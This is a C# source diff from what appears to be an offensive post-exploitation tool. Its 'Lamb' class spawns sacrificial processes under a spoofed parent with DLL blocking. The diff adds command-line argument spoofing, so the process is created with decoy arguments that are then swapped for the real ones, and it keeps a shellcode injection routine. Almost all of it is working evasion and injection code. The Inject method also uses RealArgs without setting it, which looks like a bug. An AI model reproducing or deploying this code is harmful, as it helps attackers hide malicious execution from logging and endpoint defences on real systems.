@@ -4,8 +4,10 @@ using DemoApp.Injection;
 using Microsoft.Win32.SafeHandles;
 
 using System;
+using System.Collections;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -17,7 +19,8 @@ namespace DemoApp.Sacrificial
         readonly bool BlockDLLs;
 
         string Command;
-        string SpawnTo;
+        string FakeArgs;
+        string RealArgs;
 
         public Lamb(int PPID, bool BlockDLLs = true)
         {
@@ -44,32 +47,43 @@ namespace DemoApp.Sacrificial
         const uint CREATE_SUSPENDED = 0x00000004;
         #endregion
 
-        public string Run(string Command)
+        public string Run(string Command, string FakeArgs, string RealArgs)
         {
             this.Command = Command;
-
-            var pi = Sacrifice(out IntPtr readPipe);
-            return ReadFromPipe(pi, readPipe);
-        }
-
-        public string Shell(string Command)
-        {
-            this.SpawnTo = @"C:\Windows\System32\cmd.exe";
-            this.Command = $"/c {Command}";
+            this.FakeArgs = Command + " " + FakeArgs;
+            this.RealArgs = Command + " " + RealArgs;
 
             var pi = Sacrifice(out IntPtr readPipe);
 
-            var mole = new Mole(pi, this.Command);
+            var mole = new Mole(pi, this.RealArgs);
             mole.SpoofArgs();
 
             return ReadFromPipe(pi, readPipe);
         }
 
-        public string Inject(string SpawnTo, byte[] Shellcode)
+        public string Shell(string FakeArgs, string RealArgs)
         {
-            this.SpawnTo = SpawnTo;
+            this.Command = @"C:\Windows\System32\cmd.exe";
+            this.FakeArgs = FakeArgs;
+            this.RealArgs = RealArgs;
+
             var pi = Sacrifice(out IntPtr readPipe);
-            
+
+            var mole = new Mole(pi, this.RealArgs);
+            mole.SpoofArgs();
+
+            return ReadFromPipe(pi, readPipe);
+        }
+
+        public string Inject(string SpawnTo, string FakeArgs, byte[] Shellcode)
+        {
+            this.Command = SpawnTo;
+            this.FakeArgs = FakeArgs;
+            var pi = Sacrifice(out IntPtr readPipe);
+
+            var mole = new Mole(pi, this.RealArgs);
+            mole.SpoofArgs();
+
             var needle = new Needle(pi);
             needle.Inject(Shellcode);
 
@@ -193,8 +207,8 @@ namespace DemoApp.Sacrificial
                 ts.nLength = Marshal.SizeOf(ts);
 
                 CreateProcess(
-                    SpawnTo,
-                    "this is a load of bollocks", //Command,
+                    Command,
+                    FakeArgs,
                     ref ps,
                     ref ts,
                     true,
@@ -270,7 +284,6 @@ namespace DemoApp.Sacrificial
             // Return result
             return result.ToString();
         }
-
 
         [DllImport("kernel32.dll")]
         static extern bool CreateProcess(
